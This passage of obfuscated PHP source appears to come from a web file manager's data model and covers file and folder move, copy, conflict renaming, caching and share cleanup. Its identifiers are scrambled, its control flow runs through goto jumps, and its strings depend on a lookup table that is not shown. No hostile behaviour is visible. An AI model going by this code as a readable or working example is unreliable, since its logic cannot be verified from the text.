$d¼Ô×ºÙÕ[404] => 0, $d¼Ô×ºÙÕ[534] => $d¼Ô×ºÙÕ[33]); return $B‘»’ï¶Å×; } private function _copyApplyMeta($Bñò’¿×İ, &$aíºË·ªøà) { $FÅïÈîñ†£ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cèƒ¥İÌÄ = $Bñò’¿×İ[$FÅïÈîñ†£[377]]; $e„Ä’£œÎ¸ = $Bñò’¿×İ[$FÅïÈîñ†£[28]]; if (!isset($Bñò’¿×İ[$FÅïÈîñ†£[535]]) || !$Bñò’¿×İ[$FÅïÈîñ†£[535]] || $Bñò’¿×İ[$FÅïÈîñ†£[535]] == $FÅïÈîñ†£[476]) { $aíºË·ªøà[$FÅïÈîñ†£[511]][] = array($FÅïÈîñ†£[377], $cèƒ¥İÌÄ, $FÅïÈîñ†£[535], short_id($cèƒ¥İÌÄ)); } if (Input::check($e„Ä’£œÎ¸, $FÅïÈîñ†£[536])) { $aíºË·ªøà[$FÅïÈîñ†£[510]][] = array($FÅïÈîñ†£[377] => $cèƒ¥İÌÄ, $FÅïÈîñ†£[99] => $FÅïÈîñ†£[424], $FÅïÈîñ†£[368] => str_replace($FÅïÈîñ†£[50], $FÅïÈîñ†£[33], Pinyin::encode($e„Ä’£œÎ¸))); $aíºË·ªøà[$FÅïÈîñ†£[510]][] = array($FÅïÈîñ†£[377] => $cèƒ¥İÌÄ, $FÅïÈîñ†£[99] => $FÅïÈîñ†£[423], $FÅïÈîñ†£[368] => Pinyin::encode($e„Ä’£œÎ¸, $FÅïÈîñ†£[537])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Díà¯—³å) { goto Eø†ãïÑö; aÎĞ¥¶Áª¢: $E¦îÅÑÉë = array($bÀšÅîÍö[467] => array($bÀšÅîÍö[491], $eµ‹Âº„ßõ[$bÀšÅîÍö[467]] . $Díà¯—³å . $bÀšÅîÍö[492]), $bÀšÅîÍö[405] => $this->targetIsDelete); $A˜èóâÌáÓ = $this->field($EôÎßµÅÇ)->where($E¦îÅÑÉë)->select(); if (!$A˜èóâÌáÓ) { return; } goto B¨› …Ààõ; Eø†ãïÑö: $bÀšÅîÍö =& $_SERVER[¶ªÕß‚ØÁŸ]; $eµ‹Âº„ßõ = $this->sourceInfo($Díà¯—³å); $EôÎßµÅÇ = $bÀšÅîÍö[538]; goto aÎĞ¥¶Áª¢; B¨› …Ààõ: $A˜èóâÌáÓ = array_to_keyvalue($A˜èóâÌáÓ, $bÀšÅîÍö[377]); foreach ($A˜èóâÌáÓ as $B˜å˜¹†ë¼) { $E¾ç™Ï‹‡“ = $B˜å˜¹†ë¼[$bÀšÅîÍö[469]]; $Díà¯—³å = $B˜å˜¹†ë¼[$bÀšÅîÍö[377]]; if (!isset($this->_childrenListCache[$Díà¯—³å]) && $B˜å˜¹†ë¼[$bÀšÅîÍö[378]] == $bÀšÅîÍö[93]) { $this->_childrenListCache[$Díà¯—³å] = array(); } if (!isset($this->_childrenListCache[$E¾ç™Ï‹‡“])) { $this->_childrenListCache[$E¾ç™Ï‹‡“] = array(); } $this->_childrenListCache[$E¾ç™Ï‹‡“][$Díà¯—³å] = $B˜å˜¹†ë¼; $this->_childrenItemCache[$Díà¯—³å] = $B˜å˜¹†ë¼; } goto cØ†¾¥ÓÒ±; cØ†¾¥ÓÒ±: } private function _childrenListAll($b÷ÙÀôùË, &$a‡˜¶“»Å) { $A¶†ãó¢á† =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($this->_childrenListCache[$b÷ÙÀôùË])) { return; } $b ‚Ä­Ùã = $this->_childrenListCache[$b÷ÙÀôùË]; foreach ($b ‚Ä­Ùã as $E³¿àˆíŠÔ => $fóƒ³Ó›¤§) { $a‡˜¶“»Å[$E³¿àˆíŠÔ] = $fóƒ³Ó›¤§; if ($fóƒ³Ó›¤§[$A¶†ãó¢á†[378]] == $A¶†ãó¢á†[93]) { $this->_childrenListAll($E³¿àˆíŠÔ, $a‡˜¶“»Å); } } } private function sourceInfoCache($AÃÈÖ˜Ô«÷) { if (isset($this->_childrenItemCache[$AÃÈÖ˜Ô«÷])) { return $this->_childrenItemCache[$AÃÈÖ˜Ô«÷]; } return $this->sourceInfo($AÃÈÖ˜Ô«÷); } private function _childrenList($b¾ôèˆ³‰“) { if (isset($this->_childrenListCache[$b¾ôèˆ³‰“])) { return $this->_childrenListCache[$b¾ôèˆ³‰“]; } return $this->_childrenListSelect($b¾ôèˆ³‰“); } private function _childrenListSelect($cî‚’Ù‰²”) { goto dÍŒÙÕ§; dÍŒÙÕ§: $f±ƒ¢ßÎ¼‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f–µ¶ô«­Å = array($f±ƒ¢ßÎ¼‚[469] => $cî‚’Ù‰²”, $f±ƒ¢ßÎ¼‚[405] => $this->targetIsDelete); $BŠ‘Ø¸õâ = $this->where($f–µ¶ô«­Å)->select(); goto f¥äö§íº; f¥äö§íº: $BŠ‘Ø¸õâ = $BŠ‘Ø¸õâ ? $BŠ‘Ø¸õâ : array(); $d—ñ¥‚¡² = array_to_keyvalue($BŠ‘Ø¸õâ, $f±ƒ¢ßÎ¼‚[377]); $this->_childrenListCache[$cî‚’Ù‰²”] = $d—ñ¥‚¡²; goto FÅÀâšëí; FÅÀâšëí: foreach ($d—ñ¥‚¡² as $cî‚’Ù‰²” => $dÀ±Â„Ş¹ø) { $this->_childrenItemCache[$cî‚’Ù‰²”] = $dÀ±Â„Ş¹ø; } return $d—ñ¥‚¡²; goto Aâ˜Öîõ­ì; Aâ˜Öîõ­ì: } private function fileNameExistCache($f˜åÏ¹È£ó, $aŠã†Æ¦‡©) { $a×®ÆŸ‚ÜŞ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aŠã†Æ¦‡© = strtolower($aŠã†Æ¦‡©); $AõŒÔâ‹ğ„ = $this->_childrenList($f˜åÏ¹È£ó); foreach ($AõŒÔâ‹ğ„ as $B—³â¯‘‹) { if ($aŠã†Æ¦‡© == strtolower($B—³â¯‘‹[$a×®ÆŸ‚ÜŞ[28]])) { return $B—³â¯‘‹[$a×®ÆŸ‚ÜŞ[377]]; } } return !1; } private function fileNameAutoCache($dà†«­­§, $Cä”¸ß¼êã, $eÈ¾«ÇÅŠ¶, $c—’İÊÈ›) { $A«ØÖˆ á² =& $_SERVER[¶ªÕß‚ØÁŸ]; $aµŠ˜ÆÉƒá = $this->_childrenList($dà†«­­§); $aº‡³ò¡†ï = array_to_keyvalue($aµŠ˜ÆÉƒá, $A«ØÖˆ á²[33], $A«ØÖˆ á²[28]); return $this->fileNameAutoGet($aº‡³ò¡†ï, $Cä”¸ß¼êã, $eÈ¾«ÇÅŠ¶, $c—’İÊÈ›); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($cß³Âæí¸•, $B“Ù„öòõô, $cæ–£À´£ä = REPEAT_REPLACE, $eù½¨¶¾¾½ = '') { goto f¯éŒ“ÊÍÒ; cèªÉ®ƒÙ: Hook::trigger($EÒ›Á¤ˆ©[539], $d‹ÎÛ¼ñ); $this->targetIsDelete = intval($AËŠµÉ›õá[$EÒ›Á¤ˆ©[405]]); if ($AËŠµÉ›õá[$EÒ›Á¤ˆ©[469]] == $B“Ù„öòõô && $eù½¨¶¾¾½ != $AËŠµÉ›õá[$EÒ›Á¤ˆ©[28]]) { $C•µ™Î‰Ï = $this->fileNameExist($B“Ù„öòõô, $eù½¨¶¾¾½); if ($C•µ™Î‰Ï && $AËŠµÉ›õá[$EÒ›Á¤ˆ©[378]] == $EÒ›Á¤ˆ©[476]) { goto båË³¹® ‰; a¸¡­ª¬Ò: $this->removeNow($cß³Âæí¸•, !1); $this->folderSizeReset($B“Ù„öòõô); Hook::trigger($EÒ›Á¤ˆ©[540], $d‹ÎÛ¼ñ); goto Câ «æ”–Æ; båË³¹® ‰: $E¦¦œÃ©Õ = $this->sourceInfo($C•µ™Î‰Ï); $A£öó…â® = $this->fileHistory($E¦¦œÃ©Õ, $AËŠµÉ›õá[$EÒ›Á¤ˆ©[427]], $AËŠµÉ›õá[$EÒ›Á¤ˆ©[87]]); if (!$A£öó…â®) { Model($EÒ›Á¤ˆ©[430])->remove($AËŠµÉ›õá[$EÒ›Á¤ˆ©[427]]); } goto a¸¡­ª¬Ò; Câ «æ”–Æ: return $C•µ™Î‰Ï; goto bÁ½ÜÄÍØò; bÁ½ÜÄÍØò: } } goto b°ÙøÖ¿«Ì; f¯éŒ“ÊÍÒ: $EÒ›Á¤ˆ© =& $_SERVER[¶ªÕß‚ØÁŸ]; $AËŠµÉ›õá = $this->sourceInfo($cß³Âæí¸•); $bï¬Ùùí½ = $this->sourceInfo($B“Ù„öòõô); goto fÖëéÛŠ; F‚—¹Û›¢: $B•”«õ‹“Å = array($EÒ›Á¤ˆ©[509] => array(), $EÒ›Á¤ˆ©[541] => !1); $this->clearShare($cß³Âæí¸•, $B“Ù„öòõô); $dãƒˆ¹°àæ = $this->fileNameExistCache($B“Ù„öòõô, $AËŠµÉ›õá[$EÒ›Á¤ˆ©[28]]); goto EŒ—é˜é²â; FÀ¼×ĞÃ‡‚: Model($EÒ›Á¤ˆ©[177])->linkAdd($B•”«õ‹“Å[$EÒ›Á¤ˆ©[509]]); if ($dãƒˆ¹°àæ && $B•”«õ‹“Å[$EÒ›Á¤ˆ©[541]]) { $this->removeNow($cß³Âæí¸•, !1); } $this->lockMoveEnd($cß³Âæí¸•); goto AñİÒ´–İ; b°ÙøÖ¿«Ì: $dÖ‘Ì™„Ş‘ = $eù½¨¶¾¾½ ? $eù½¨¶¾¾½ : $AËŠµÉ›õá[$EÒ›Á¤ˆ©[28]]; $this->lockMoveStart($cß³Âæí¸•); $this->lockWriteStart($B“Ù„öòõô, $dÖ‘Ì™„Ş‘); goto F‚—¹Û›¢; EŒ—é˜é²â: $a£èøáå½¹ = $this->_move($cß³Âæí¸•, $B“Ù„öòõô, $cæ–£À´£ä, $B•”«õ‹“Å, $eù½¨¶¾¾½); $this->sourceCacheClear(); if ($AËŠµÉ›õá[$EÒ›Á¤ˆ©[378]] == $EÒ›Á¤ˆ©[93] && $dãƒˆ¹°àæ) { $this->folderSizeResetChildren($a£èøáå½¹); } goto FÀ¼×ĞÃ‡‚; fÖëéÛŠ: $d‹ÎÛ¼ñ = $this->pathInfoMore($cß³Âæí¸•); if ($this->isParentOf($cß³Âæí¸•, $B“Ù„öòõô)) { return !1; } if (!$AËŠµÉ›õá || !$bï¬Ùùí½ || $bï¬Ùùí½[$EÒ›Á¤ˆ©[378]] != $EÒ›Á¤ˆ©[93]) { return !1; } goto cèªÉ®ƒÙ; f ÇÃñ†éï: Model($EÒ›Á¤ˆ©[513])->eventMove($cß³Âæí¸•, $AËŠµÉ›õá[$EÒ›Á¤ˆ©[469]], $B“Ù„öòõô); Hook::trigger($EÒ›Á¤ˆ©[540], $d‹ÎÛ¼ñ); return $a£èøáå½¹; goto E‹‡×İÇ”Ñ; AñİÒ´–İ: $this->lockWriteEnd($B“Ù„öòõô, $dÖ‘Ì™„Ş‘); $this->folderSizeReset($AËŠµÉ›õá[$EÒ›Á¤ˆ©[469]]); $this->folderSizeReset($B“Ù„öòõô); goto e„Ø‹õ¿‰õ; e„Ø‹õ¿‰õ: $CŒõ´âÈó‘ = array($AËŠµÉ›õá[$EÒ›Á¤ˆ©[469]], $B“Ù„öòõô); if ($AËŠµÉ›õá[$EÒ›Á¤ˆ©[378]] == $EÒ›Á¤ˆ©[93]) { $CŒõ´âÈó‘[] = $cß³Âæí¸•; } $this->updateModifyTime($CŒõ´âÈó‘); goto f ÇÃñ†éï; E‹‡×İÇ”Ñ: } private function _move($a„¯Ÿöª°¬, $CÏÙÓÀ†Ù, $cİ§”ïõ©ì, &$a³œæã†ÆÒ, $AÚ¯×ªŸ© = '') { goto CÔêÇÉÑ‰„; CÄ¨ôğ´¿Ü: $DÈğ”£ªÜ‘ = $AÚ¯×ªŸ© ? $AÚ¯×ªŸ© : $Dº–ÅŒò£[$fŠåÄÆ„°¹[28]]; $DéÁò ­á = $this->fileNameExistCache($CÏÙÓÀ†Ù, $DÈğ”£ªÜ‘); $this->lockMoveStart($a„¯Ÿöª°¬); goto EÕ”ŒÉöå; B˜’ßÏ…£´: $C÷Ïäñø†« = !1; if ($EšÆö æ®) { if ($cİ§”ïõ©ì == REPEAT_RENAME_FOLDER) { $DÈğ”£ªÜ‘ = $this->fileNameAuto($CÏÙÓÀ†Ù, $DÈğ”£ªÜ‘, $cİ§”ïõ©ì, $EšÆö æ®); $b®»¿ã«©¥ = $this->_moveForce($a„¯Ÿöª°¬, $CÏÙÓÀ†Ù, $DÈğ”£ªÜ‘); } else { if ($cİ§”ïõ©ì == REPEAT_RENAME_FOLDER) { $cİ§”ïõ©ì = REPEAT_RENAME; } $Câæ»‡‡Ê¶ = $this->_childrenListSelect($a„¯Ÿöª°¬); foreach ($Câæ»‡‡Ê¶ as $dÛœ„Üö†‡) { $this->_move($dÛœ„Üö†‡[$fŠåÄÆ„°¹[377]], $DéÁò ­á, $cİ§”ïõ©ì, $a³œæã†ÆÒ); } $C÷Ïäñø†« = !0; } } else { if ($cİ§”ïõ©ì == REPEAT_SKIP) { $C÷Ïäñø†« = !0; } else { if ($cİ§”ïõ©ì == REPEAT_RENAME || $cİ§”ïõ©ì == REPEAT_RENAME_FOLDER) { $DÈğ”£ªÜ‘ = $this->fileNameAuto($CÏÙÓÀ†Ù, $DÈğ”£ªÜ‘, $cİ§”ïõ©ì, $EšÆö æ®); $b®»¿ã«©¥ = $this->_moveForce($a„¯Ÿöª°¬, $CÏÙÓÀ†Ù, $DÈğ”£ªÜ‘); } else { if ($cİ§”ïõ©ì == REPEAT_REPLACE) { $BÅœ‹âÎ•± = $this->sourceInfoCache($DéÁò ­á); $Dâ©Ìğ´Ã‡ = $this->fileHistory($BÅœ‹âÎ•±, $Dº–ÅŒò£[$fŠåÄÆ„°¹[427]], $Dº–ÅŒò£[$fŠåÄÆ„°¹[87]]); if ($Dâ©Ìğ´Ã‡) { $a³œæã†ÆÒ[$fŠåÄÆ„°¹[509]][] = $Dº–ÅŒò£[$fŠåÄÆ„°¹[427]]; } else { $C÷Ïäñø†« = !0; } } } } } if ($C÷Ïäñø†« && !$a³œæã†ÆÒ[$fŠåÄÆ„°¹[541]]) { $a³œæã†ÆÒ[$fŠåÄÆ„°¹[541]] = !0; } goto fâŞï—¤ğ; EÕ”ŒÉöå: $this->lockWriteStart($CÏÙÓÀ†Ù, $DÈğ”£ªÜ‘); if (!$DéÁò ­á) { return $this->_moveForce($a„¯Ÿöª°¬, $CÏÙÓÀ†Ù, $DÈğ”£ªÜ‘); } $b®»¿ã«©¥ = $DéÁò ­á; goto B˜’ßÏ…£´; CÔêÇÉÑ‰„: $fŠåÄÆ„°¹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dº–ÅŒò£ = $this->sourceInfo($a„¯Ÿöª°¬); $EšÆö æ® = $Dº–ÅŒò£[$fŠåÄÆ„°¹[378]] == $fŠåÄÆ„°¹[93]; goto CÄ¨ôğ´¿Ü; fâŞï—¤ğ: return $b®»¿ã«©¥; goto E¹òÚµ·ö™; E¹òÚµ·ö™: } private function _moveForce($fÒµ×ˆ†Ü«, $d‚–”î©®, $eé¸ÙÊäÉ) { goto C•õ§èÙ™¨; C•õ§èÙ™¨: $A—šÌ½‡ï =& $_SERVER[¶ªÕß‚ØÁŸ]; $d›ÌÌ‰áóŞ = $this->sourceInfo($fÒµ×ˆ†Ü«); $eò²›Î‹ = $this->sourceInfo($d‚–”î©®); goto EÜôó„¯Ñí; Eâİº¼Úò: if ($d¦…ä§ùä) { $DÎ”œâÅêñ = array($A—šÌ½‡ï[533] => array($A—šÌ½‡ï[491], $d›ÌÌ‰áóŞ[$A—šÌ½‡ï[467]] . $d›ÌÌ‰áóŞ[$A—šÌ½‡ï[377]] . $A—šÌ½‡ï[492])); $CÉÏ¿âÏ¹¹ = $d›ÌÌ‰áóŞ[$A—šÌ½‡ï[467]] . $d›ÌÌ‰áóŞ[$A—šÌ½‡ï[377]] . $A—šÌ½‡ï[47]; $D ¥ï”ÈÁø = $eò²›Î‹[$A—šÌ½‡ï[467]] . $eò²›Î‹[$A—šÌ½‡ï[377]] . $A—šÌ½‡ï[47] . $d›ÌÌ‰áóŞ[$A—šÌ½‡ï[377]] . $A—šÌ½‡ï[47]; $e¿ŠÜğÚ¦ = array($A—šÌ½‡ï[533] => array($A—šÌ½‡ï[542], "\x72\x65\x70\154\141\143\145\x28\160\x61\162\145\x6e\x74\x4c\145\166\145\154\54\47{$CÉÏ¿âÏ¹¹}\x27\x2c\x27{$D ¥ï”ÈÁø}\47\x29"), $A—šÌ½‡ï[529] => $eò²›Î‹[$A—šÌ½‡ï[379]], $A—šÌ½‡ï[530] => $eò²›Î‹[$A—šÌ½‡ï[464]]); if ($bÒÃŒŠ¡ˆô) { $e¿ŠÜğÚ¦[$A—šÌ½‡ï[404]] = 0; } $this->where($DÎ”œâÅêñ)->data($e¿ŠÜğÚ¦)->save(); } $this->where(array($A—šÌ½‡ï[391] => $fÒµ×ˆ†Ü«))->data($aäõ¶®ËÕ)->save(); return $fÒµ×ˆ†Ü«; goto e›½Òôè­ö; EÜôó„¯Ñí: $d¦…ä§ùä = $d›ÌÌ‰áóŞ[$A—šÌ½‡ï[378]] == $A—šÌ½‡ï[93]; $aäõ¶®ËÕ = array($A—šÌ½‡ï[376] => $eò²›Î‹[$A—šÌ½‡ï[377]], $A—šÌ½‡ï[533] => $eò²›Î‹[$A—šÌ½‡ï[467]] . $eò²›Î‹[$A—šÌ½‡ï[377]] . $A—šÌ½‡ï[47], $A—šÌ½‡ï[529] => $eò²›Î‹[$A—šÌ½‡ï[379]], $A—šÌ½‡ï[530] => $eò²›Î‹[$A—šÌ½‡ï[464]], $A—šÌ½‡ï[532] => USER_ID, $A—šÌ½‡ï[394] => $eé¸ÙÊäÉ); $F‘ê‘ĞèÇ = $d›ÌÌ‰áóŞ[$A—šÌ½‡ï[379]] == SourceModel::TYPE_GROUP && $eò²›Î‹[$A—šÌ½‡ï[379]] == SourceModel::TYPE_GROUP && $d›ÌÌ‰áóŞ[$A—šÌ½‡ï[464]] == $eò²›Î‹[$A—šÌ½‡ï[464]]; goto aÆ…óöÇ’Û; aÆ…óöÇ’Û: if (!$F‘ê‘ĞèÇ) { Model($A—šÌ½‡ï[462])->authClear($fÒµ×ˆ†Ü«); } $bÒÃŒŠ¡ˆô = $d›ÌÌ‰áóŞ[$A—šÌ½‡ï[405]] == $A—šÌ½‡ï[93] && $eò²›Î‹[$A—šÌ½‡ï[405]] != $A—šÌ½‡ï[93]; if ($bÒÃŒŠ¡ˆô) { $aäõ¶®ËÕ[$A—šÌ½‡ï[404]] = 0; } goto Eâİº¼Úò; e›½Òôè­ö: } private function clearShare($BÒˆùÉ‡â¤, $E²›ôÓ· ) { goto dé±«Šƒõ; dÖŞÈ£İ¢İ: if ($AòÕ“®Ÿ«Ï[$FÜ«óÓ†ó[464]] == $FÉ¿óµŒÂ•[$FÜ«óÓ†ó[464]] && $AòÕ“®Ÿ«Ï[$FÜ«óÓ†ó[379]] == $FÜ«óÓ†ó[543]) { return; } $B¨ˆŸ¥ƒ· = array($FÜ«óÓ†ó[467] => array($FÜ«óÓ†ó[491], $AòÕ“®Ÿ«Ï[$FÜ«óÓ†ó[467]] . $BÒˆùÉ‡â¤ . $FÜ«óÓ†ó[492])); $EËÑ´ˆ» = $this->field($FÜ«óÓ†ó[391])->where($B¨ˆŸ¥ƒ·)->getField($FÜ«óÓ†ó[377], !0); goto f‚²Ò—¹Á™; dÍ»´ Ş: if (!$B‚ë‚”éÎ†) { return; } $B‚ë‚”éÎ† = array_to_keyvalue($B‚ë‚”éÎ†, $FÜ«óÓ†ó[33], $FÜ«óÓ†ó[449]); $B¨ˆŸ¥ƒ· = array($FÜ«óÓ†ó[449] => array($FÜ«óÓ†ó[7], $B‚ë‚”éÎ†)); goto A‹…É³Şâ; f‚²Ò—¹Á™: if (!$EËÑ´ˆ») { return; } $B¨ˆŸ¥ƒ· = array($FÜ«óÓ†ó[377] => array($FÜ«óÓ†ó[7], $EËÑ´ˆ»), $FÜ«óÓ†ó[456] => 1); $B‚ë‚”éÎ† = Model($FÜ«óÓ†ó[544])->field($FÜ«óÓ†ó[449])->where($B¨ˆŸ¥ƒ·)->select(); goto dÍ»´ Ş; dé±«Šƒõ: $FÜ«óÓ†ó =& $_SERVER[¶ªÕß‚ØÁŸ]; $AòÕ“®Ÿ«Ï = $this->sourceInfo($BÒˆùÉ‡â¤); $FÉ¿óµŒÂ• = $this->sourceInfo($E²›ôÓ· ); goto dÖŞÈ£İ¢İ; A‹…É³Şâ: Model($FÜ«óÓ†ó[544])->where($B¨ˆŸ¥ƒ·)->save(array($FÜ«óÓ†ó[456] => 0)); Model($FÜ«óÓ†ó[545])->where($B¨ˆŸ¥ƒ·)->delete(); goto Fõ·Æ¬Ô¨Ù; Fõ·Æ¬Ô¨Ù: } public function copyFolderFromIO($Fù¨ÌƒÕØ¥, $C„²’Ë¤®¡, $F‡ÅÔø„Ÿ‘, $A·Öê÷“Ì, $AîÒÏÛä, $BÉß“½ÃĞ = false) { goto bêå…È¦Á¦; BÛÉ’œù²Ù: Hook::trigger($F‘…ã²ìö[548]); if ($F©èõ„ÂÚ) { $this->folderSizeResetChildren($F©èõ„ÂÚ); } $this->_childrenListClear(); goto FÁµë¯ç„; FÁµë¯ç„: Model($F‘…ã²ìö[512])->addAll($b´àÓîĞŒÖ[$F‘…ã²ìö[510]], array(), !0); Model($F‘…ã²ìö[513])->eventCopy($F©èõ„ÂÚ); $this->saveAll($b´àÓîĞŒÖ[$F‘…ã²ìö[511]]); goto EÈÑ†¿²‹®; Dñ¼²êß®ï: if ($eÒø¦Âù) { $this->_childrenAllMake($eÒø¦Âù); } Hook::trigger($F‘…ã²ìö[547]); $this->_copyChildTo($Fù¨ÌƒÕØ¥, $C„²’Ë¤®¡, $F©èõ„ÂÚ, $A·Öê÷“Ì, $b´àÓîĞŒÖ, $AîÒÏÛä); goto BÛÉ’œù²Ù; AƒÆ•ì¾ï: $eÒø¦Âù = $this->fileNameExist($F‡ÅÔø„Ÿ‘, $A™¼ßß›ÓŒ); $F©èõ„ÂÚ = $this->mkdir($F‡ÅÔø„Ÿ‘, $A™¼ßß›ÓŒ, $A·Öê÷“Ì); if (!$eÒø¦Âù || $A·Öê÷“Ì == REPEAT_RENAME_FOLDER) { $A·Öê÷“Ì = !1; } goto Dñ¼²êß®ï; Bœ•©×Åè: $this->updateModifyTime($F‡ÅÔø„Ÿ‘); return $F©èõ„ÂÚ; goto b‰ö¡Î¿®Ş; bêå…È¦Á¦: $F‘…ã²ìö =& $_SERVER[¶ªÕß‚ØÁŸ]; $b´àÓîĞŒÖ = array($F‘…ã²ìö[510] => array(), $F‘…ã²ìö[511] => array(), $F‘…ã²ìö[509] => array(), $F‘…ã²ìö[546] => array()); $A™¼ßß›ÓŒ = $BÉß“½ÃĞ ? $BÉß“½ÃĞ : $Fù¨ÌƒÕØ¥->getPathName($Fù¨ÌƒÕØ¥->pathThis($C„²’Ë¤®¡)); goto AƒÆ•ì¾ï; EÈÑ†¿²‹®: Model($F‘…ã²ìö[430])->linkAdd($b´àÓîĞŒÖ[$F‘…ã²ìö[509]]); Model($F‘…ã²ìö[430])->remove($b´àÓîĞŒÖ[$F‘…ã²ìö[546]]); $this->folderSizeReset($F‡ÅÔø„Ÿ‘); goto Bœ•©×Åè; b‰ö¡Î¿®Ş: } private function _copyChildTo($dßä±Ö‹óé, $E›Ÿ®ª­µº, $f›®Şó¶åÇ, $e‹“ÇË—ò, &$eİ–âÔ²†È, $EŞ·¸Ü§–) { goto C°†ÈÈˆƒ; a…ˆÂ‚ôß™: $c•¯­ÆÈÜ = array_merge($F´øŸ¤êÕ[$C…–ƒŒõÒ[83]], $F´øŸ¤êÕ[$C…–ƒŒõÒ[84]]); $bÍ„‰ÂÅŠÃ = $this->_addFiles($dßä±Ö‹óé, $F´øŸ¤êÕ[$C…–ƒŒõÒ[83]], $EŞ·¸Ü§–); $AîÎá ¼¦ = array(); goto cÁö­Ú¾«è; A©ƒÉóÒ÷: $DĞÀê¥›ô = $this->_childrenList($f›®Şó¶åÇ); $DĞÀê¥›ô = array_to_keyvalue($DĞÀê¥›ô, $C…–ƒŒõÒ[28]); foreach ($c•¯­ÆÈÜ as $C¶š†ïˆÚµ) { $e»ã¼øª¦Ñ = $DĞÀê¥›ô[$C¶š†ïˆÚµ[$C…–ƒŒõÒ[28]]]; $A–Êç±æˆ = $e»ã¼øª¦Ñ[$C…–ƒŒõÒ[377]]; $this->_copyApplyMeta($e»ã¼øª¦Ñ, $eİ–âÔ²†È); if ($C¶š†ïˆÚµ[$C…–ƒŒõÒ[29]] == $C…–ƒŒõÒ[86]) { $C¶š†ïˆÚµ[$C…–ƒŒõÒ[85]] = $dßä±Ö‹óé->getPathInner($C¶š†ïˆÚµ[$C…–ƒŒõÒ[85]]); $this->_copyChildTo($dßä±Ö‹óé, $C¶š†ïˆÚµ[$C…–ƒŒõÒ[85]], $A–Êç±æˆ, $e‹“ÇË—ò, $eİ–âÔ²†È, $EŞ·¸Ü§–); } } goto CÔÎĞÖÅÌˆ; cÁö­Ú¾«è: foreach ($c•¯­ÆÈÜ as &$C¶š†ïˆÚµ) { goto a³¹Èñ›ÙÚ; A²¸èŒâğ‹: $C¶š†ïˆÚµ[$C…–ƒŒõÒ[87]] = _get($C¶š†ïˆÚµ, $C…–ƒŒõÒ[87], 0); $C¶š†ïˆÚµ[$C…–ƒŒõÒ[427]] = _get($C¶š†ïˆÚµ, $C…–ƒŒõÒ[427], 0); if (!isset($C¶š†ïˆÚµ[$C…–ƒŒõÒ[549]]) && $C¶š†ïˆÚµ[$C…–ƒŒõÒ[427]]) { $eİ–âÔ²†È[$C…–ƒŒõÒ[546]][] = $C¶š†ïˆÚµ[$C…–ƒŒõÒ[427]]; } goto dßàÀÇ–ï‹; dßàÀÇ–ï‹: if ($e‹“ÇË—ò) { $b±õ¿ªï¼õ = $this->fileNameExistCache($f›®Şó¶åÇ, $C¶š†ïˆÚµ[$C…–ƒŒõÒ[28]]); if ($b±õ¿ªï¼õ) { if ($C¶š†ïˆÚµ[$C…–ƒŒõÒ[378]] || $e‹“ÇË—ò == REPEAT_SKIP) { continue; } if ($e‹“ÇË—ò == REPEAT_REPLACE) { $e»ã¼øª¦Ñ = $this->sourceInfoCache($b±õ¿ªï¼õ); $EÄ¯ÆõÙ…‡ = $this->fileHistory($e»ã¼øª¦Ñ, $C¶š†ïˆÚµ[$C…–ƒŒõÒ[427]], $C¶š†ïˆÚµ[$C…–ƒŒõÒ[87]]); if ($EÄ¯ÆõÙ…‡) { $eİ–âÔ²†È[$C…–ƒŒõÒ[509]][] = $C¶š†ïˆÚµ[$C…–ƒŒõÒ[427]]; } continue; } else { if ($e‹“ÇË—ò == REPEAT_RENAME) { $C¶š†ïˆÚµ[$C…–ƒŒõÒ[28]] = $this->fileNameAutoCache($f›®Şó¶åÇ, $C¶š†ïˆÚµ[$C…–ƒŒõÒ[28]], $e‹“ÇË—ò, !1); } } } } if (!$C¶š†ïˆÚµ[$C…–ƒŒõÒ[378]] && $C¶š†ïˆÚµ[$C…–ƒŒõÒ[427]]) { $eİ–âÔ²†È[$C…–ƒŒõÒ[509]][] = $C¶š†ïˆÚµ[$C…–ƒŒõÒ[427]]; } $AîÎá ¼¦[] = $this->_makeItemData($C¶š†ïˆÚµ, $B±«š‹ùä, $C¶š†ïˆÚµ[$C…–ƒŒõÒ[28]]); goto d“’Ñ‘«‘; a³¹Èñ›ÙÚ: if (isset($bÍ„‰ÂÅŠÃ[$C¶š†ïˆÚµ[$C…–ƒŒõÒ[28]]])) { $C¶š†ïˆÚµ = $bÍ„‰ÂÅŠÃ[$C¶š†ïˆÚµ[$C…–ƒŒõÒ[28]]]; } $C¶š†ïˆÚµ[$C…–ƒŒõÒ[378]] = $C¶š†ïˆÚµ[$C…–ƒŒõÒ[29]] == $C…–ƒŒõÒ[86]; $C¶š†ïˆÚµ[$C…–ƒŒõÒ[380]] = _get($C¶š†ïˆÚµ, $C…–ƒŒõÒ[170], $C…–ƒŒõÒ[33]); goto A²¸èŒâğ‹; d“’Ñ‘«‘: } unset($C¶š†ïˆÚµ); if (!empty($AîÎá ¼¦)) { $this->addAll($AîÎá ¼¦); } goto A©ƒÉóÒ÷; C°†ÈÈˆƒ: $C…–ƒŒõÒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B±«š‹ùä = $this->sourceInfoCache($f›®Şó¶åÇ); $F´øŸ¤êÕ = $dßä±Ö‹óé->listPath($E›Ÿ®ª­µº, !1, !0); goto a…ˆÂ‚ôß™; CÔÎĞÖÅÌˆ: } private function _addFiles($Bô¥™ÂÑ¯Ö, $eÃù¬‰İá’, $dÚÉŒÄÂí§) { goto a„’…¦ÏÅÑ; fƒœäŠµÔº: $F†¢Úˆó»½ = array(); foreach ($eÃù¬‰İá’ as $cåŒ‰À¦Ã·) { if (isset($cåŒ‰À¦Ã·[$Cô•®ÄÏŠ[549]]) && $cåŒ‰À¦Ã·[$Cô•®ÄÏŠ[549]]) { continue; } $f›¿Ó®Áµ¬ = $Bô¥™ÂÑ¯Ö->getPathInner($cåŒ‰À¦Ã·[$Cô•®ÄÏŠ[85]]); $D„¼Ş¨Ù£ = $E‰º‚±Ÿ¼‹->addFileMake($f›¿Ó®Áµ¬, $cåŒ‰À¦Ã·[$Cô•®ÄÏŠ[87]], 